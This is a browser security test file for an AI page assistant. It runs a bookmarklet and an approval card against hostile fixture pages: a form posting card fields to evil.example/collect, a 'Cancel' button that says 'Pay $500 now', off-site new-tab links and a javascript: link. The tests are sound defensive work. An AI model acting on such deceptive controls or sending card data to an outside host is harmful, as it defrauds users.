import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { createRequire } from 'node:module';
import { after, before, test } from 'node:test';

// Security review of page actions in a real browser: the real bookmarklet against hostile markup, and the approval card
// when a page chooses its own words. Every HTTP response is a fixture.
const require = createRequire(import.meta.url);
let chromium;
try { ({ chromium } = require('playwright')); } catch {}
const browserTest = chromium ? test : test.skip;
const widget = await readFile(new URL('../public/widget.html', import.meta.url), 'utf8');
const bookmarklet = (await readFile(new URL('../bookmarklet.js', import.meta.url), 'utf8')).replaceAll('__ORIGIN__', 'https://pagebot.example.test').replaceAll('__VERSION__', '10').replace(/\n\s*/g, '');
let browser;
before(async () => {
  if (chromium) browser = await chromium.launch({ executablePath: process.env.CHROMIUM_PATH || '/usr/bin/chromium', headless: true, args: ['--no-sandbox'] });
});
after(async () => { await browser?.close(); });

// ---- the real bookmarklet, asked to act by a stand-in panel on the pagebot origin ----
const hostile = `<!doctype html><html><body>
  <form action="https://evil.example/collect" method="post">
    <input type="hidden" name="target" value="x"><input type="hidden" name="action" value="y">
    <input id="card" name="n" aria-labelledby="cardlabel"><span id="cardlabel">Card number</span>
    <input id="dots" name="x1" style="-webkit-text-security:disc" aria-label="Code">
    <input id="ccn" name="cc_number" aria-label="Number">
    <button id="cancel" aria-label="Cancel">Pay $500 now</button>
    <button id="other" type="submit" formaction="https://evil.example/other" formtarget="_blank">Other</button>
  </form>
  <a id="tab" href="https://evil.example/login" target="_blank">Learn more</a>
  <a id="home" href="/about" target="_blank">About</a>
  <button id="plain" type="button" onclick="window.plain = (window.plain || 0) + 1">Add</button>
  <input id="name" aria-label="Your name" value="Ann">
</body></html>`;

async function bm(t) {
  const context = await browser.newContext({ viewport: { width: 1000, height: 900 } });
  context.setDefaultTimeout(5000);
  const requests = [];
  await context.route('**/*', route => {
    const url = new URL(route.request().url());
    requests.push(url.href);
    if (url.hostname === 'news.example.test') return route.fulfill({ contentType: 'text/html', body: hostile });
    // the panel's stand-in: sends the bookmarklet's messages from the pagebot origin and hands back the replies
    if (url.hostname === 'pagebot.example.test' && url.pathname === '/widget') return route.fulfill({ contentType: 'text/html', body: `<!doctype html><script>
      let seq = 0; const waiting = new Map();
      addEventListener('message', e => { if (e.data && waiting.has(e.data.id)) { waiting.get(e.data.id)(e.data); waiting.delete(e.data.id); } });
      window.act = (name, input, extra = {}) => new Promise(res => { const id = ++seq; waiting.set(id, res); parent.postMessage({ type: 'act', id, name, input, ...extra }, '*'); });
      parent.postMessage({ type: 'ready' }, '*');</script>` });
    return route.fulfill({ status: 200, contentType: 'text/html', body: '<!doctype html>ok' }); // anything the page navigates to
  });
  const page = await context.newPage();
  const popups = [];
  page.on('popup', p => popups.push(p.url()));
  t.after(() => context.close());
  await page.goto('https://news.example.test/article');
  await page.evaluate(bookmarklet);
  const frame = await (async () => { for (let i = 0; i < 50; i++) { const f = page.frames().find(f => f.url().startsWith('https://pagebot.example.test/widget')); if (f && await f.evaluate(() => !!window.act).catch(() => false)) return f; await page.waitForTimeout(50); } throw new Error('no panel'); })();
  const act = (name, input, extra) => frame.evaluate(([n, i, x]) => window.act(n, i, x), [name, input, extra]);
  const els = async query => (await act('els', { query })).els;
  const ref = async label => (await els('')).find(e => e.label === label).ref;
  return { page, act, els, ref, requests, popups };
}

browserTest('a form whose fields are named "target" and "action" still counts as a page change, and a button’s own formaction decides where it goes', async t => {
  const b = await bm(t);
  const cancel = await b.ref('Cancel'), other = await b.ref('Other');
  const dry = await b.act('click', { ref: cancel }, { dry: 1 });
  assert.equal(dry.nav, 'https://evil.example/collect', 'what the card will say, though form.action and form.target are the two hidden fields');
  assert.equal(dry.label, 'Cancel');
  assert.equal(dry.text, 'Pay $500 now', 'and the button’s own words');
  assert.equal((await b.act('click', { ref: cancel })).no, 'nav');
  const o = await b.act('click', { ref: other }, { dry: 1 });
  assert.deepEqual([o.nav, o.tab], ['', 'https://evil.example/other'], 'a submit into another site’s new tab');
  assert.equal((await b.act('click', { ref: other })).no, 'tab');
  await b.page.waitForTimeout(150);
  assert.deepEqual(b.requests.filter(u => u.includes('evil.example')), [], 'nothing was submitted');
  assert.deepEqual(b.popups, []);
});

browserTest('another site’s link in a new tab asks first, and a same-site one does not', async t => {
  const b = await bm(t);
  const tab = await b.ref('Learn more'), about = await b.ref('About');
  assert.equal((await b.act('click', { ref: tab })).no, 'tab');
  assert.equal((await b.act('click', { ref: tab }, { sure: 'https://evil.example/else' })).no, 'tab', 'an approval for a different address does not count');
  assert.deepEqual(b.popups, []);
  assert.equal((await b.act('click', { ref: about })).role, 'link');
  await b.page.waitForFunction(() => true);
  for (let i = 0; i < 40 && b.popups.length < 1; i++) await b.page.waitForTimeout(50);
  assert.equal(b.popups.length, 1);
  assert.equal((await b.act('click', { ref: tab }, { sure: 'https://evil.example/login' })).tab, 'https://evil.example/login');
  for (let i = 0; i < 40 && b.popups.length < 2; i++) await b.page.waitForTimeout(50);
  assert.equal(b.popups.length, 2);
});

browserTest('fields named only by aria-labelledby, by dots drawn over text, or by a card name with an underscore are never read or typed into', async t => {
  const b = await bm(t);
  const list = await b.els('');
  const by = l => list.find(e => e.label === l);
  assert.equal(by('Code').no, 'password');
  for (const label of ['Card number', 'Number']) assert.equal(by(label).no, 'payment', label);
  for (const label of ['Card number', 'Code', 'Number']) assert.equal((await b.act('fill', { ref: by(label).ref, text: 'x' })).no && true, true, label);
  assert.equal(await b.page.inputValue('#card') + await b.page.inputValue('#dots') + await b.page.inputValue('#ccn'), '');
  assert.equal((await b.act('fill', { ref: by('Your name').ref, text: 'Bo' })).value, 'Bo');
});

// ---- the approval card ----
const boot = {
  authed: true, who: 'user', theme: 'ember', lockMinutes: 0,
  user: { id: 1, name: 'Test reader', status: 'trusted', allowWeb: true, allowActions: true, passcode: false },
  prefs: { theme: 'ember', model: 'haiku', web: false, actions: true, actionsAuto: false },
  limits: { maxTokens: 2048, pageTokens: 5000, maxSearches: 3 },
  models: [{ key: 'haiku', label: 'Haiku' }],
};
async function panel(t, prefs = {}) {
  const context = await browser.newContext({ reducedMotion: 'reduce', viewport: { width: 1000, height: 900 } });
  context.setDefaultTimeout(5000);
  const state = { requests: [], errors: [] };
  t.after(async () => { await context.close(); assert.deepEqual(state.errors, []); });
  await context.addInitScript(() => {
    localStorage.setItem('pb_token', 'test-session');
    const real = window.fetch;
    window.fetch = (url, opts) => {
      if (String(url) !== '/api/chat') return real(url, opts);
      const enc = new TextEncoder();
      return Promise.resolve(new Response(new ReadableStream({ start(c) { window.__push = ev => c.enqueue(enc.encode(JSON.stringify(ev) + '\n')); } }), { headers: { 'Content-Type': 'application/x-ndjson' } }));
    };
  });
  // what the page says about three controls: a Cancel that is really Pay now, a link to another site's tab, and a script link
  const hostPage = `<!doctype html><html><body><script>
    window.hostRequests = [];
    const info = {
      1: { role: 'button', label: 'Cancel', text: 'Pay $500 now', nav: '' },
      2: { role: 'link', label: 'Learn more', nav: '', tab: 'https://evil.example/login' },
      3: { role: 'link', label: 'Go', nav: 'javascript:' },
    };
    addEventListener('message', event => {
      if (event.source !== document.querySelector('iframe')?.contentWindow) return;
      const r = event.data, send = x => event.source.postMessage({ id: r.id, ...x }, event.origin);
      window.hostRequests.push(r);
      if (r.type === 'page') return send({ page: { url: 'https://news.example.test/a', title: 'A', text: 'x' }, selection: '' });
      if (r.type === 'act') send(info[r.input && r.input.ref] || { no: 'gone' });
    });
  </script><iframe title="Pagebot" src="https://pagebot.example.test/widget?v=10" style="width:440px;height:840px;border:0"></iframe></body></html>`;
  await context.route('**/*', async route => {
    const request = route.request(), url = new URL(request.url());
    const json = value => route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(value) });
    if (url.hostname === 'news.example.test') return route.fulfill({ contentType: 'text/html', body: hostPage });
    if (url.pathname === '/widget') return route.fulfill({ contentType: 'text/html', body: widget });
    state.requests.push({ path: url.pathname, body: request.postDataJSON() });
    if (url.pathname === '/api/boot') return json({ ...boot, prefs: { ...boot.prefs, ...prefs }, version: 10 });
    if (url.pathname === '/api/chat/act' || url.pathname === '/api/ping') return json({ ok: true });
    if (url.pathname === '/api/site-memory') return json({ memories: [], maxSites: 100, maxInstructions: 4000 });
    state.errors.push(`Unexpected request: ${request.method()} ${url.pathname}`);
    return route.fulfill({ status: 404, body: 'Unexpected test request' });
  });
  const page = await context.newPage();
  page.on('pageerror', error => state.errors.push(error.message));
  await page.goto('https://news.example.test/a');
  const frame = page.frames().find(f => f.url().startsWith('https://pagebot.example.test/'));
  await frame.locator('#setBtn').waitFor({ state: 'visible' });
  await frame.locator('#boot').waitFor({ state: 'detached' });
  await frame.locator('#q').fill('Cancel my order');
  await frame.locator('#sendBtn').click();
  await frame.waitForFunction(() => !!window.__push);
  const click = ref => frame.evaluate(r => window.__push(r), { t: 'act', id: 'c' + ref, name: 'click', input: { ref }, wait: 300000 });
  const sent = () => page.evaluate(() => window.hostRequests.filter(r => r.type === 'act' && !r.dry));
  return { frame, click, sent, requests: state.requests };
}

browserTest('the approval card shows the control’s own words next to the label the model was shown', { skip: 'TODO(part B): the approval card comes back with clicks (the bookmarklet checks above still run)' }, async t => {
  const p = await panel(t);
  await p.click(1);
  await p.frame.locator('.acard').waitFor();
  assert.match(await p.frame.locator('.acard .aq').innerText(), /Click the “Cancel” button/);
  assert.match(await p.frame.locator('.acard .ad').innerText(), /The button itself says “Pay \$500 now”/);
  assert.deepEqual(await p.frame.locator('.acard button').allInnerTexts(), ['Allow', 'Skip', 'Allow all for this answer']);
});

browserTest('a link that opens another site in a new tab asks even with permissions skipped, names the site, and has no Allow all', { skip: 'TODO(part B): the approval card comes back with clicks (the bookmarklet checks above still run)' }, async t => {
  const p = await panel(t, { actionsAuto: true });
  await p.click(1); // an ordinary click: skip mode lets it through
  for (let i = 0; i < 40 && (await p.sent()).length < 1; i++) await new Promise(r => setTimeout(r, 50));
  assert.equal(await p.frame.locator('.acard').count(), 0);
  await p.click(2);
  await p.frame.locator('.acard.nav').waitFor();
  assert.match(await p.frame.locator('.acard .aw').innerText(), /opens evil\.example\/login in a new tab/);
  assert.deepEqual(await p.frame.locator('.acard button').allInnerTexts(), ['Allow', 'Skip']);
  assert.equal((await p.sent()).filter(r => r.input.ref === 2).length, 0, 'nothing has been clicked yet');
  await p.frame.getByRole('button', { name: 'Allow', exact: true }).click();
  for (let i = 0; i < 40 && !(await p.sent()).some(r => r.input.ref === 2); i++) await new Promise(r => setTimeout(r, 50));
  const go = (await p.sent()).find(r => r.input.ref === 2);
  assert.equal(go.sure, 'https://evil.example/login', 'the approved address goes along, so the bookmark can tell if the link has changed');
  const posted = p.requests.filter(r => r.path === '/api/chat/act').map(r => r.body);
  assert.ok(posted.some(r => r.id === 'c2'), 'and the result goes back to the model');
});

browserTest('a link that runs a script before leaving says so, rather than naming a site', { skip: 'TODO(part B): the approval card comes back with clicks (the bookmarklet checks above still run)' }, async t => {
  const p = await panel(t);
  await p.click(3);
  await p.frame.locator('.acard.nav').waitFor();
  assert.match(await p.frame.locator('.acard .aw').innerText(), /runs a script that may leave the page/);
  assert.deepEqual(await p.frame.locator('.acard button').allInnerTexts(), ['Allow', 'Skip']);
  await p.frame.getByRole('button', { name: 'Allow', exact: true }).click();
  for (let i = 0; i < 40 && !(await p.sent()).some(r => r.input.ref === 3); i++) await new Promise(r => setTimeout(r, 50));
  assert.equal((await p.sent()).find(r => r.input.ref === 3).sure, 'javascript:');
});
